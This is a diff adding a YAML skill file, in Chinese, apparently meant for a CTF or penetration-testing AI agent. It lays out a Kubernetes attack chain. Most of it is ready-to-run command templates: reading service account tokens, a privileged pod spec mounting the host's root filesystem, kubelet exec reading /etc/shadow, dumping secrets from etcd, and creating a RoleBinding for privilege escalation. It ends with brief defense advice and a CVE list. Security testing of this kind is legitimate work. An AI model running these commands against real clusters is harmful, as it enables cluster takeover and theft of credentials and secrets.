@@ -1,0 +1,386 @@
+name: k8s_security
+description: Kubernetes安全测试 - 涵盖K8s集群渗透、Pod逃逸、API滥用、RBAC绕过、Secret窃取等完整攻击链
+version: "2.0"
+author: CTF-Agent Team
+tags: [kubernetes, k8s, cloud-native, container, security]
+priority: high
+
+# 使用场景
+scenarios:
+  - Kubernetes集群安全评估
+  - K8s API Server渗透测试
+  - Pod安全策略验证
+  - RBAC权限审计
+  - 云原生环境攻击模拟
+
+# 核心技术
+techniques:
+  - API Server攻击: 未授权访问、认证绕过、权限滥用
+  - Pod逃逸: 特权Pod、hostPath挂载、Service Account滥用
+  - RBAC绕过: 权限配置错误、角色绑定滥用
+  - Secret窃取: etcd数据窃取、Secret挂载读取
+  - 组件漏洞: kubelet、etcd、dashboard漏洞利用
+  - 网络攻击: Service网络滥用、CNI漏洞
+
+# 工具列表
+tools:
+  - kube-hunter: K8s安全扫描器
+  - kubectl: K8s命令行工具
+  - kubeletctl: kubelet攻击工具
+  - peirates: K8s渗透工具
+  - k8s-pentest-tool: K8s渗透框架
+  - kube-applier: RBAC配置分析
+  - cdK: 容器逃逸工具(含K8s模块)
+  - k9s: K8s终端UI
+
+# K8s架构理解
+architecture:
+  components:
+    - API Server: 集群入口点，认证授权
+    - kubelet: 节点代理，Pod管理
+    - etcd: 集群数据存储
+    - Controller Manager: 控制器
+    - Scheduler: 调度器
+    - kube-proxy: 网络代理
+    - Dashboard: Web管理界面
+    - Ingress: 入口控制器
+
+  ports:
+    - API Server: 6443/443
+    - kubelet: 10250/10255
+    - etcd: 2379/2380
+    - Dashboard: 8001
+    - Scheduler: 10251
+    - Controller: 10252
+
+# 信息收集阶段
+reconnaissance:
+  - cluster_info:
+    template: |
+      # 1. 发现K8s集群
+
+      # 端口扫描
+      nmap -p 6443,10250,2379,8001 -sV target.com
+
+      # 2. 获取集群信息
+
+      # 使用kube-hunter
+      kube-hunter --remote target.com
+
+      # 3. 检查API Server
+
+      # 未授权访问检测
+      curl -k https://target.com:6443/api/v1
+      curl -k https://target.com:6443/version
+
+      # 4. 检查kubelet
+
+      curl -k https://node:10250/pods
+      curl -k https://node:10250/runningpods
+
+      # 5. 检查etcd
+
+      curl -k https://etcd:2379/v2/keys
+
+  - pod_enumeration:
+    template: |
+      # Pod枚举
+
+      # 在Pod内部执行
+      # 检查环境变量
+      env | grep KUBERNETES
+
+      # 检查Service Account
+      ls /var/run/secrets/kubernetes.io/serviceaccount/
+      cat /var/run/secrets/kubernetes.io/serviceaccount/token
+      cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
+      cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+
+      # 使用kubectl (如果有)
+      kubectl get pods
+      kubectl get nodes
+      kubectl get secrets
+
+# API Server攻击
+api_server_attack:
+  - unauthorized_access:
+    template: |
+      # API Server未授权访问
+
+      # 检测
+      curl -k https://api-server:6443/api/v1/nodes
+      curl -k https://api-server:6443/api/v1/pods
+      curl -k https://api-server:6443/api/v1/secrets
+
+      # 利用
+      # 获取所有Secrets
+      curl -k https://api-server:6443/api/v1/secrets | jq
+
+      # 创建特权Pod
+      curl -k -X POST https://api-server:6443/api/v1/namespaces/default/pods \
+        -H "Content-Type: application/json" \
+        -d @privileged_pod.json
+
+      # privileged_pod.json
+      {
+        "apiVersion": "v1",
+        "kind": "Pod",
+        "metadata": {"name": "escape-pod"},
+        "spec": {
+          "containers": [{
+            "name": "escape",
+            "image": "alpine",
+            "command": ["sleep", "3600"],
+            "securityContext": {"privileged": true},
+            "volumeMounts": [{
+              "name": "host",
+              "mountPath": "/mnt/host"
+            }]
+          }],
+          "volumes": [{
+            "name": "host",
+            "hostPath": {"path": "/"}
+          }]
+        }
+      }
+
+  - service_account_abuse:
+    template: |
+      # Service Account滥用
+
+      # 获取token
+      TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+      APISERVER=https://kubernetes.default.svc
+
+      # 使用token枚举
+      curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/pods
+      curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/secrets
+
+      # 检查权限
+      curl -k -H "Authorization: Bearer $TOKEN" \
+        $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
+        -d '{"spec":{"resourceAttributes":{"namespace":"default","verb":"create","resource":"pods"}}}'
+
+      # 创建恶意Pod
+      curl -k -H "Authorization: Bearer $TOKEN" \
+        -X POST $APISERVER/api/v1/namespaces/default/pods \
+        -H "Content-Type: application/json" \
+        -d '{"apiVersion":"v1","kind":"Pod","spec":{...}}'
+
+# kubelet攻击
+kubelet_attack:
+  - template: |
+      # kubelet API攻击
+
+      # 1. 检查kubelet端口
+      nmap -p 10250,10255 target-node
+
+      # 2. 访问kubelet API
+
+      # 获取Pod列表
+      curl -k https://node:10250/pods
+
+      # 获取运行Pod
+      curl -k https://node:10250/runningpods
+
+      # 3. 执行命令
+
+      # 在容器内执行命令
+      curl -k -X POST \
+        "https://node:10250/exec/<namespace>/<pod>/<container>?command=/bin/sh&input=1&output=1&tty=1"
+
+      # 使用kubeletctl
+      kubeletctl -i node:10250 pods
+      kubeletctl -i node:10250 exec "<pod>" "<container>" "cat /etc/shadow"
+
+      # 4. kubelet读取端口 (10255)
+      curl http://node:10255/pods
+
+# etcd攻击
+etcd_attack:
+  - template: |
+      # etcd数据窃取
+
+      # 1. 检查etcd端口
+      nmap -p 2379,2380 target
+
+      # 2. 访问etcd (可能需要证书)
+
+      # v2 API
+      curl -k https://etcd:2379/v2/keys/
+      curl -k https://etcd:2379/v2/keys/registry/secrets/default
+
+      # v3 API (需要etcdctl)
+      ETCDCTL_API=3 etcdctl --endpoints=https://etcd:2379 \
+        --cacert=ca.crt --cert=server.crt --key=server.key \
+        get /registry/secrets --prefix
+
+      # 3. 窃取Secrets
+
+      # 获取所有Secrets
+      ETCDCTL_API=3 etcdctl get /registry/secrets --prefix --keys-only
+
+      # 获取特定Secret
+      ETCDCTL_API=3 etcdctl get /registry/secrets/default/my-secret
+
+      # 4. 窃取Service Account tokens
+      ETCDCTL_API=3 etcdctl get /registry/secrets/default/default-token-xxxx
+
+# RBAC绕过
+rbac_bypass:
+  - misconfigured_rbac:
+    template: |
+      # RBAC配置错误
+
+      # 1. 检查当前权限
+
+      kubectl auth can-i --list
+      kubectl auth can-i create pods --all-namespaces
+      kubectl auth can-i get secrets --all-namespaces
+
+      # 2. 检查RoleBinding
+
+      kubectl get rolebindings --all-namespaces
+      kubectl get clusterrolebindings
+
+      # 3. 常见危险配置
+
+      # 过度授权的ClusterRole
+      kubectl get clusterrole view -o yaml  # 可能包含敏感资源
+
+      # cluster-admin绑定到普通用户
+      kubectl get clusterrolebinding | grep cluster-admin
+
+      # 4. 利用RBAC
+
+      # 创建RoleBinding提升权限
+      kubectl create rolebinding privileged-binding \
+        --clusterrole=admin --user=attacker --namespace=default
+
+      # 5. 创建自定义Role
+
+      # secrets-reader.yaml
+      apiVersion: rbac.authorization.k8s.io/v1
+      kind: Role
+      metadata:
+        name: secrets-reader
+      rules:
+      - apiGroups: [""]
+        resources: ["secrets"]
+        verbs: ["get", "list"]
+
+      kubectl apply -f secrets-reader.yaml
+
+# Secret窃取
+secret_extraction:
+  - template: |
+      # K8s Secret窃取
+
+      # 1. 列出Secrets
+      kubectl get secrets --all-namespaces
+
+      # 2. 获取Secret内容
+      kubectl get secret my-secret -o yaml
+
+      # 3. 解码Secret
+      kubectl get secret my-secret -o jsonpath='{.data.password}' | base64 -d
+
+      # 4. 从挂载读取
+      ls /mnt/secrets/
+      cat /mnt/secrets/password
+
+      # 5. 从etcd读取
+      ETCDCTL_API=3 etcdctl get /registry/secrets/default/my-secret
+
+      # 6. 常见敏感Secret
+
+      # Service Account token
+      kubectl get secret default-token-xxxx -o yaml
+
+      # TLS证书
+      kubectl get secret -n kube-system
+
+      # 云凭证
+      kubectl get secret -n kube-system aws-secret
+
+# Dashboard攻击
+dashboard_attack:
+  - template: |
+      # K8s Dashboard攻击
+
+      # 1. 发现Dashboard
+      nmap -p 8001,9090 target
+
+      # 2. 检测未授权访问
+      curl -k https://target:8001/api/v1/pod
+
+      # 3. Dashboard漏洞利用
+
+      # 早期版本(1.10.1)存在未授权访问
+      # 可通过Dashboard创建特权Pod
+
+      # 4. Token绕过
+      # 使用获取的Service Account token登录
+      kubectl proxy
+      # 访问 http://localhost:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/
+
+# Pod安全策略绕过
+psp_bypass:
+  - template: |
+      # PodSecurityPolicy绕过
+
+      # 1. 检查PSP
+      kubectl get psp
+
+      # 2. 检查PSP绑定
+      kubectl get rolebinding -o yaml | grep psp
+
+      # 3. 绕过方法
+
+      # 寻找宽松的PSP
+      kubectl get psp -o yaml | grep -A20 privileged
+
+      # 使用有权限的Service Account
+      # 修改Pod配置符合宽松PSP
+
+      # 4. PSP已弃用，使用PodSecurity标准
+
+      kubectl label namespace default \
+        pod-security.kubernetes.io/warn=restricted
+
+# 常见CVE
+cves:
+  - CVE-2018-1002105:
+    description: kube-apiserver代理劫持
+    affected: v1.9.x - v1.12.x
+
+  - CVE-2019-11253:
+    description: YAML解析DoS
+    affected: v1.0-1.15
+
+  - CVE-2019-11246:
+    description: kubectl cp路径遍历
+    affected: v1.12.x-1.14.x
+
+  - CVE-2020-8555:
+    description: kubelet镜像拉取SSRF
+    affected: v1.15-1.18
+
+# 防御建议
+defense:
+  - 启用RBAC: 限制最小权限
+  - NetworkPolicy: 网络隔离
+  - PodSecurityPolicy: Pod安全策略
+  - 审计日志: 记录API调用
+  - Secret加密: etcd加密存储
+  - 定期更新: 修复已知漏洞
+  - 限制特权Pod: 禁止特权容器
+  - Service Account限制: 限制默认token
+
+# 参考资源
+references:
+  - https://github.com/aquasecurity/kube-hunter
+  - https://github.com/kubernetes/kubernetes
+  - https://kubernetes.io/docs/concepts/security/
+  - https://book.hacktricks.xyz/cloud-security/kubernetes-security
+  - https://github.com/kubernetes/community/blob/master/sig-security/security-audit-2019/findings/Kubernetes%20Final%20Report.pdf
